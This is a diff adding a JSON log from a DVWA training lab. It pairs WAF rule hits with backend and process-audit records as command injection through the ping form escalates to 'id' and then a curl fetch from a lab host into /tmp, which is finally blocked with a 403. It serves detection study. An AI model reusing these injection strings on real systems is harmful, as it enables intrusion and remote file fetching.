@@ -1,0 +1,286 @@
+[
+  {
+    "waf_time_utc": "2026-10-28T22:50:40.234642+00:00",
+    "request_id": "auJ8PTTQ95ExmOxxYEDNuAAAAAI",
+    "input": [
+      "ip=127.0.0.1&Submit=Submit"
+    ],
+    "status": 200,
+    "mode": "DETECTION_ONLY",
+    "rule_ids": [
+      "920350"
+    ],
+    "backend": {
+      "timestamp": "2026-10-28T22:50:37.108Z",
+      "vhost": "dvwa-backend.lab:8081",
+      "client_ip": "127.0.0.1",
+      "request_id": "auJ8PT_h4AndW33zM7uxFQAAAAM",
+      "forwarded_request_id": "auJ8PTTQ95ExmOxxYEDNuAAAAAI",
+      "method": "POST",
+      "path": "/vulnerabilities/exec/index.php",
+      "status": 200,
+      "response_bytes": 1657,
+      "pid": 13058,
+      "duration_us": 3125850
+    },
+    "shell": {
+      "timestamp": 1793227837.124,
+      "audit_serial": "894",
+      "pid": 13608,
+      "ppid": 13058,
+      "euid": 33,
+      "command": "sh -c -- 'ping  -c 4 127.0.0.1'"
+    },
+    "children": [
+      {
+        "timestamp": 1793227837.128,
+        "audit_serial": "895",
+        "pid": 13609,
+        "ppid": 13608,
+        "euid": 33,
+        "exe": "/usr/bin/ping",
+        "command": "ping -c 4 127.0.0.1"
+      }
+    ]
+  },
+  {
+    "waf_time_utc": "2026-10-28T22:52:54.186047+00:00",
+    "request_id": "auJ8wxKgGYZnEyquB9dG6AAAAAQ",
+    "input": [
+      "ip=127.0.0.1%3B+id&Submit=Submit"
+    ],
+    "status": 200,
+    "mode": "DETECTION_ONLY",
+    "rule_ids": [
+      "920350"
+    ],
+    "backend": {
+      "timestamp": "2026-10-28T22:52:51.078Z",
+      "vhost": "dvwa-backend.lab:8081",
+      "client_ip": "127.0.0.1",
+      "request_id": "auJ8w7fJTWSJE9BTKvdIaAAAAAA",
+      "forwarded_request_id": "auJ8wxKgGYZnEyquB9dG6AAAAAQ",
+      "method": "POST",
+      "path": "/vulnerabilities/exec/index.php",
+      "status": 200,
+      "response_bytes": 1675,
+      "pid": 13618,
+      "duration_us": 3107013
+    },
+    "shell": {
+      "timestamp": 1793227971.082,
+      "audit_serial": "951",
+      "pid": 14325,
+      "ppid": 13618,
+      "euid": 33,
+      "command": "sh -c -- 'ping  -c 4 127.0.0.1; id'"
+    },
+    "children": [
+      {
+        "timestamp": 1793227971.083,
+        "audit_serial": "952",
+        "pid": 14326,
+        "ppid": 14325,
+        "euid": 33,
+        "exe": "/usr/bin/ping",
+        "command": "ping -c 4 127.0.0.1"
+      },
+      {
+        "timestamp": 1793227974.183,
+        "audit_serial": "953",
+        "pid": 14332,
+        "ppid": 14325,
+        "euid": 33,
+        "exe": "/usr/bin/id",
+        "command": "id"
+      }
+    ]
+  },
+  {
+    "waf_time_utc": "2026-10-28T22:55:38.538653+00:00",
+    "request_id": "auJ9Z22WV9dQBmHAY3MC_wAAAAM",
+    "input": [
+      "ip=127.0.0.1%3B+%2Fusr%2Fbin%2Fid&Submit=Submit"
+    ],
+    "status": 200,
+    "mode": "DETECTION_ONLY",
+    "rule_ids": [
+      "920350",
+      "932160",
+      "949110",
+      "980130"
+    ],
+    "backend": {
+      "timestamp": "2026-10-28T22:55:35.432Z",
+      "vhost": "dvwa-backend.lab:8081",
+      "client_ip": "127.0.0.1",
+      "request_id": "auJ9Z29K8rSmpaT0W2QGLAAAAAU",
+      "forwarded_request_id": "auJ9Z22WV9dQBmHAY3MC_wAAAAM",
+      "method": "POST",
+      "path": "/vulnerabilities/exec/index.php",
+      "status": 200,
+      "response_bytes": 5086,
+      "pid": 14917,
+      "duration_us": 3104863
+    },
+    "shell": {
+      "timestamp": 1793228135.436,
+      "audit_serial": "1161",
+      "pid": 15280,
+      "ppid": 14917,
+      "euid": 33,
+      "command": "sh -c -- 'ping  -c 4 127.0.0.1; /usr/bin/id'"
+    },
+    "children": [
+      {
+        "timestamp": 1793228135.438,
+        "audit_serial": "1162",
+        "pid": 15281,
+        "ppid": 15280,
+        "euid": 33,
+        "exe": "/usr/bin/ping",
+        "command": "ping -c 4 127.0.0.1"
+      },
+      {
+        "timestamp": 1793228138.535,
+        "audit_serial": "1163",
+        "pid": 15283,
+        "ppid": 15280,
+        "euid": 33,
+        "exe": "/usr/bin/id",
+        "command": "/usr/bin/id"
+      }
+    ]
+  },
+  {
+    "waf_time_utc": "2026-10-28T22:55:51.831471+00:00",
+    "request_id": "auJ9dNiFW_n_Ji-Anla9kwAAAAA",
+    "input": [
+      "ip=127.0.0.1%3B+%2Fusr%2Fbin%2Fid%3B+curl+--interface+192.168.144.20+--proxy+http%3A%2F%2F192.168.144.20%3A3128+--noproxy+%22%22+http%3A%2F%2F192.168.144.1%3A8090%2Ftraining-note.txt+-o+%2Ftmp%2Fsoc-training-note.txt&Submit=Submit"
+    ],
+    "status": 200,
+    "mode": "DETECTION_ONLY",
+    "rule_ids": [
+      "920350",
+      "932100",
+      "932110",
+      "932160",
+      "949110",
+      "980130"
+    ],
+    "backend": {
+      "timestamp": "2026-10-28T22:55:48.674Z",
+      "vhost": "dvwa-backend.lab:8081",
+      "client_ip": "127.0.0.1",
+      "request_id": "auJ9dHPHLjtSpgadiReI8wAAAAQ",
+      "forwarded_request_id": "auJ9dNiFW_n_Ji-Anla9kwAAAAA",
+      "method": "POST",
+      "path": "/vulnerabilities/exec/index.php",
+      "status": 200,
+      "response_bytes": 5086,
+      "pid": 15305,
+      "duration_us": 3156363
+    },
+    "shell": {
+      "timestamp": 1793228148.682,
+      "audit_serial": "1166",
+      "pid": 15312,
+      "ppid": 15305,
+      "euid": 33,
+      "command": "sh -c -- 'ping  -c 4 127.0.0.1; /usr/bin/id; curl --interface 192.168.144.20 --proxy http://192.168.144.20:3128 --noproxy \"\" http://192.168.144.1:8090/training-note.txt -o /tmp/soc-training-note.txt'"
+    },
+    "children": [
+      {
+        "timestamp": 1793228148.684,
+        "audit_serial": "1167",
+        "pid": 15313,
+        "ppid": 15312,
+        "euid": 33,
+        "exe": "/usr/bin/ping",
+        "command": "ping -c 4 127.0.0.1"
+      },
+      {
+        "timestamp": 1793228151.783,
+        "audit_serial": "1168",
+        "pid": 15321,
+        "ppid": 15312,
+        "euid": 33,
+        "exe": "/usr/bin/id",
+        "command": "/usr/bin/id"
+      },
+      {
+        "timestamp": 1793228151.784,
+        "audit_serial": "1169",
+        "pid": 15322,
+        "ppid": 15312,
+        "euid": 33,
+        "exe": "/usr/bin/curl",
+        "command": "curl --interface 192.168.144.20 --proxy http://192.168.144.20:3128 --noproxy '' http://192.168.144.1:8090/training-note.txt -o /tmp/soc-training-note.txt"
+      }
+    ]
+  },
+  {
+    "waf_time_utc": "2026-10-28T22:57:00.657951+00:00",
+    "request_id": "auJ9vAu4EmFW7RLbUz-8ugAAAAA",
+    "input": [
+      "ip=127.0.0.1%3B+%2Fusr%2Fbin%2Fid%3B+curl+--interface+192.168.144.20+--proxy+http%3A%2F%2F192.168.144.20%3A3128+--noproxy+%22%22+http%3A%2F%2F192.168.144.1%3A8090%2Ftraining-note.txt+-o+%2Ftmp%2Fsoc-training-note.txt&Submit=Submit"
+    ],
+    "status": 403,
+    "mode": "ENABLED",
+    "rule_ids": [
+      "920350",
+      "932100",
+      "932110",
+      "932160",
+      "949110",
+      "980130"
+    ],
+    "backend": null,
+    "shell": null,
+    "children": []
+  },
+  {
+    "waf_time_utc": "2026-10-28T22:58:39.016994+00:00",
+    "request_id": "auJ-G8Y4upfwHDSEFwBDywAAAAM",
+    "input": [
+      "ip=127.0.0.1&Submit=Submit"
+    ],
+    "status": 200,
+    "mode": "ENABLED",
+    "rule_ids": [
+      "920350"
+    ],
+    "backend": {
+      "timestamp": "2026-10-28T22:58:35.898Z",
+      "vhost": "dvwa-backend.lab:8081",
+      "client_ip": "127.0.0.1",
+      "request_id": "auJ-G0pFLJBHJFCmy1ZyGQAAAAQ",
+      "forwarded_request_id": "auJ-G8Y4upfwHDSEFwBDywAAAAM",
+      "method": "POST",
+      "path": "/vulnerabilities/exec/index.php",
+      "status": 200,
+      "response_bytes": 5032,
+      "pid": 15707,
+      "duration_us": 3117869
+    },
+    "shell": {
+      "timestamp": 1793228315.904,
+      "audit_serial": "1330",
+      "pid": 16056,
+      "ppid": 15707,
+      "euid": 33,
+      "command": "sh -c -- 'ping  -c 4 127.0.0.1'"
+    },
+    "children": [
+      {
+        "timestamp": 1793228315.904,
+        "audit_serial": "1331",
+        "pid": 16057,
+        "ppid": 16056,
+        "euid": 33,
+        "exe": "/usr/bin/ping",
+        "command": "ping -c 4 127.0.0.1"
+      }
+    ]
+  }
+]
